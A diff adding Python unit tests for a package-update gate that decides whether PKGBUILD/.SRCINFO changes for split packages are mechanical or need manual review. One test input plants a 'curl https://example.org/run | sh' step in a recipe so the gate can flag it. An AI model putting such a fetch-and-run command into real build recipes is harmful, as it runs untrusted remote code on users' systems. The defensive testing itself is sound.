@@ -67,6 +67,100 @@ class GateTests(unittest.TestCase):
         self.assertEqual(self.result()['decision'], 'mechanical')
         self.assertEqual(self.result()['version'], '1.1-1')
 
+    def split_fixture(self):
+        for directory, version, release in ((self.old, '1.0', '3'), (self.new, '1.1', '1')):
+            code=(directory/'PKGBUILD').read_text().replace('pkgname=example\n',
+                'pkgbase=example\npkgname=(example python-example)\nepoch=2\n')
+            code=code.replace('pkgrel=1\n','pkgrel='+release+'\n')
+            code+='package_python-example() { depends=("${pkgbase}=${pkgver}-${pkgrel}"); }\n'
+            (directory/'PKGBUILD').write_text(code)
+            text=(directory/'.SRCINFO').read_text().replace('\tpkgrel = 1\n','\tpkgrel = '+release+'\n\tepoch = 2\n')
+            text+='pkgname = python-example\n\tdepends = example=2:'+version+'-'+release+'\n'
+            text+='\tdepends_x86_64 = example=2:'+version+'-'+release+'\n'
+            (directory/'.SRCINFO').write_text(text)
+        self.policy['_verified_transition']['srcinfo']=(self.new/'.SRCINFO').read_text()
+
+    def test_exact_split_runtime_equality_is_mechanical_with_native_evidence(self):
+        self.split_fixture()
+        self.assertEqual(self.result()['decision'],'mechanical')
+        self.assertEqual(self.result()['version'],'2:1.1-1')
+        self.policy['_verified_transition']['lock_verified']=False
+        self.assertEqual(self.result()['decision'],'manual')
+
+    def test_automatic_verifier_accepts_only_exact_split_runtime_equality(self):
+        self.split_fixture()
+        fixed={'id':'fixed','kind':'git','source':'git+https://example.org/fixed.git#tag=v1'}
+        def lock(version,release,checksum):
+            return {'version':'2:'+version+'-'+release,'sources':[
+                {'id':'release','kind':'archive',
+                 'source':f'example-{version}.tar.gz::https://example.org/v{version}.tar.gz',
+                 'checksums':{'sha256':checksum}},fixed]}
+        oldlock=lock('1.0','3',self.oldsum)
+        newlock=lock('1.1','1',self.newsum)
+        evidence=self.policy['_verified_transition']
+        self.assertTrue(verify_automatic_recipe(self.old,self.new,self.policy,oldlock,newlock,evidence))
+        with self.assertRaisesRegex(ValueError,'authentic transition'):
+            verify_automatic_recipe(self.old,self.new,self.policy,oldlock,newlock,None)
+        old=(self.old/'.SRCINFO').read_text()
+        new=(self.new/'.SRCINFO').read_text()
+        for previous,current in (
+            ('external=2:1.0-3','external=2:1.1-1'),
+            ('example>=2:1.0-3','example>=2:1.1-1'),
+            ('example=2:1.0-3','example>=2:1.1-1'),
+            ('example=2:1.0-3','python-example=2:1.1-1'),
+            ('example=2:0.9-1','example=2:1.1-1'),
+        ):
+            with self.subTest(previous=previous,current=current):
+                (self.old/'.SRCINFO').write_text(old.replace('example=2:1.0-3',previous))
+                (self.new/'.SRCINFO').write_text(new.replace('example=2:1.1-1',current))
+                with self.assertRaisesRegex(ValueError,'unaffected metadata'):
+                    verify_automatic_recipe(self.old,self.new,self.policy,oldlock,newlock,evidence)
+        for key in ('makedepends','checkdepends','depends_aarch64'):
+            with self.subTest(key=key):
+                (self.old/'.SRCINFO').write_text(old.replace('pkgname = example\n','\t'+key+' = example=2:1.0-3\npkgname = example\n'))
+                (self.new/'.SRCINFO').write_text(new.replace('pkgname = example\n','\t'+key+' = example=2:1.1-1\npkgname = example\n'))
+                with self.assertRaisesRegex(ValueError,'unaffected metadata'):
+                    verify_automatic_recipe(self.old,self.new,self.policy,oldlock,newlock,evidence)
+
+    def test_split_dependency_changes_outside_exact_own_equality_stay_manual(self):
+        self.split_fixture()
+        old=(self.old/'.SRCINFO').read_text()
+        new=(self.new/'.SRCINFO').read_text()
+        for previous, current in (
+            ('external=2:1.0-3','external=2:1.1-1'),
+            ('example>=2:1.0-3','example>=2:1.1-1'),
+            ('example=2:1.0-3','example>=2:1.1-1'),
+            ('example=2:1.0-3','python-example=2:1.1-1'),
+            ('example=2:0.9-1','example=2:1.1-1'),
+            ('example=2:1.0-3','example=1.1-1'),
+        ):
+            with self.subTest(previous=previous,current=current):
+                (self.old/'.SRCINFO').write_text(old.replace('example=2:1.0-3',previous))
+                claims=new.replace('example=2:1.1-1',current)
+                (self.new/'.SRCINFO').write_text(claims)
+                self.policy['_verified_transition']['srcinfo']=claims
+                self.assertEqual(self.result()['decision'],'manual')
+        (self.old/'.SRCINFO').write_text(old)
+        for key in ('makedepends','checkdepends','depends_aarch64'):
+            with self.subTest(key=key):
+                # Base-only fields stay in their valid original base scope.
+                previous=old.replace('pkgname = example\n','\t'+key+' = example=2:1.0-3\npkgname = example\n')
+                current=new.replace('pkgname = example\n','\t'+key+' = example=2:1.1-1\npkgname = example\n')
+                (self.old/'.SRCINFO').write_text(previous)
+                (self.new/'.SRCINFO').write_text(current)
+                self.policy['_verified_transition']['srcinfo']=current
+                self.assertEqual(self.result()['decision'],'manual')
+
+    def test_split_metadata_tamper_and_recipe_retarget_are_not_mechanical(self):
+        self.split_fixture()
+        claims=(self.new/'.SRCINFO').read_text()
+        (self.new/'.SRCINFO').write_text(claims.replace('example=2:1.1-1','example=9.9-1'))
+        self.assertEqual(self.result()['decision'],'invalid')
+        (self.new/'.SRCINFO').write_text(claims)
+        code=(self.new/'PKGBUILD').read_text()
+        (self.new/'PKGBUILD').write_text(code.replace('${pkgbase}=${pkgver}-${pkgrel}','python-example=${pkgver}-${pkgrel}'))
+        self.assertEqual(self.result()['decision'],'manual')
+
     def test_additional_recipe_changes_require_human(self):
         original = (self.new / 'PKGBUILD').read_text()
         for suffix in ['# updated\n', 'depends=(curl)\n', 'pkgver=9.0\n', 'package() { curl https://example.org/run | sh; }\n']:
